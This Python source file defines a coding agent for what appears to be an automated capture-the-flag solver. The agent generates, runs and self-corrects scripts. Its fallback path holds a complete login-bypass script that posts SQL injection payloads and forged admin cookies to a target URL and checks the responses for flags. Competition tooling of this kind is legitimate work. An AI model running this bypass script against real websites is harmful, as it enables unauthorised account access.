"""
Coding Specialist Agent

Specialized agent for programming, scripting, and automation challenges.
"""

from typing import Dict, Any, List, Optional
from agents.base_agent import BaseAgent, AgentType
from tools.common.python_tool import PythonTool
from core.decision_engine.llm_reasoner import LLMReasoner
from core.utils.flag_utils import find_first_flag
import re

class CodingAgent(BaseAgent):
    """
    Specialist agent for programming and scripting challenges.
    
    Handles:
    - Python/Bash/Ruby scripting
    - Algorithm implementation
    - Data parsing and transformation
    - Automation of repetitive tasks
    - Code debugging and fixing
    """
    
    def __init__(self, agent_id: str = "coding_agent", reasoner: Optional[LLMReasoner] = None, python_tool: Optional[PythonTool] = None):
        super().__init__(agent_id, AgentType.SPECIALIST)
        self.reasoner = reasoner or LLMReasoner()
        self.python_tool = python_tool or PythonTool()
        self.capabilities = [
            'programming',
            'scripting',
            'python',
            'bash',
            'automation',
            'algorithm',
            'debugging',
            'misc'
        ]
    
    def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a coding challenge.
        """
        description = challenge.get('description', '').lower()
        
        # Detect potential coding tasks
        coding_indicators = ['script', 'write a program', 'python', 'code', 'automate', 'parse', 'algorithm']
        is_coding = any(indicator in description for indicator in coding_indicators)
        
        detected = [k for k in coding_indicators if k in description]
        confidence = 0.9 if is_coding or challenge.get('category') == 'misc' else 0.2
        
        return {
            'agent_id': self.agent_id,
            'can_handle': is_coding or challenge.get('category') == 'misc',
            'confidence': confidence,
            'approach': self._plan_approach(detected)
        }
    
    def solve_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to solve a coding challenge by generating and running a script.
        Includes a self-correction loop.
        """
        # Get task description from inputs (passed by coordinator) or challenge description
        task_desc = challenge.get('current_task_description') or challenge.get('description', 'Solve the challenge')
        
        analysis = self.analyze_challenge(challenge)
        steps = []
        flag = None
        max_retries = 3
        
        steps.append(f"Analyzed task requirements: {task_desc}")
        
        script_content = ""
        if not self.reasoner.is_available:
            # Heuristic: If it's a login bypass task, generate a simple script
            if "login" in task_desc.lower() or "bypass" in task_desc.lower() or "authenticate" in task_desc.lower():
                steps.append("LLM not available. Generating improved heuristic login bypass script...")
                script_content = f"""
import requests
import re

url = "{challenge.get('url', 'http://localhost')}"
if not url.endswith('/'): url += '/'

# Technique 1: SQL Injection payloads
sqli_payloads = ["' OR 1=1 --", "admin' --", "admin' #", "' OR '1'='1"]

# Technique 2: Common admin paths
paths = ["", "admin", "dashboard", "api/admin"]

# Technique 3: Auth cookies
cookies = {{"admin": "true", "auth": "true", "authenticated": "true"}}

session = requests.Session()

for path in paths:
    test_url = url + path
    print(f"--- Testing URL: {{test_url}} ---")
    
    # Try with admin cookies first
    try:
        r = session.get(test_url, cookies=cookies)
        if any(x in r.text for x in ["SKY-", "NCL-", "CTF{{", "HTB{{", "flag{{"]):
            print(f"Success with cookie manipulation on {{test_url}}!")
            print(r.text)
            break
    except: pass

    # Try SQLi on login form (if it's a login page)
    for p in sqli_payloads:
        try:
            # We try to POST to common field names
            r = session.post(test_url, data={{"username": p, "password": "password", "user": p, "pass": "password"}})
            if any(x in r.text for x in ["SKY-", "NCL-", "CTF{{", "HTB{{", "flag{{"]):
                print(f"Success with SQLi payload {{p}} on {{test_url}}!")
                print(r.text)
                break
        except: pass
"""
            else:
                steps.append("Error: LLM not available for script generation and no heuristic applies.")
                return {
                    'challenge_id': challenge.get('id'),
                    'agent_id': self.agent_id,
                    'status': 'failed',
                    'flag': None,
                    'steps': steps
                }
        else:
            steps.append("Generating solution script via LLM...")
            script_content = self.reasoner.generate_script(challenge, task_desc)
        
        if script_content.startswith("# LLM not available"):
            steps.append("Error: LLM not available for script generation.")
            return {
                'challenge_id': challenge.get('id'),
                'agent_id': self.agent_id,
                'status': 'failed',
                'flag': None,
                'steps': steps
            }

        for attempt in range(max_retries + 1):
            if attempt > 0:
                steps.append(f"Attempt {attempt + 1}: Fixing script based on previous failure...")
                script_content = self.reasoner.fix_script(challenge, script_content, last_error, last_stdout)

            steps.append(f"Executing script (Attempt {attempt + 1})...")
            last_stdout = None
            try:
                res = self.python_tool.run(script_content)
                last_stdout = res.stdout
                
                if res.timed_out:
                    last_error = "Execution timed out."
                    steps.append(f"  {last_error}")
                
                if res.stdout:
                    # Centralized flag detection
                    found_flag = find_first_flag(res.stdout)
                    if found_flag:
                        flag = found_flag
                        steps.append(f"  Found flag in stdout: {flag}")
                        break
                
                if res.stderr:
                    last_error = res.stderr
                    steps.append(f"  Stderr: {res.stderr[:200]}")
                elif not res.stdout:
                    last_error = "Script produced no output."
                    steps.append(f"  {last_error}")
                else:
                    last_error = "Script executed successfully but no flag was found in stdout."
                    steps.append("  No flag detected in output.")

                if res.exit_code != 0:
                    steps.append(f"  Script failed with exit code {res.exit_code}")

            except Exception as e:
                last_error = str(e)
                steps.append(f"  Error during script execution: {e}")

            if attempt == max_retries:
                steps.append("Max retries reached. Self-correction failed.")

        return {
            'challenge_id': challenge.get('id'),
            'agent_id': self.agent_id,
            'status': 'solved' if flag else 'failed' if attempt == max_retries else 'attempted',
            'flag': flag,
            'steps': steps,
            'artifacts': {
                'generated_script': script_content,
                'final_attempt': attempt + 1
            }
        }
    
    def get_capabilities(self) -> List[str]:
        return self.capabilities
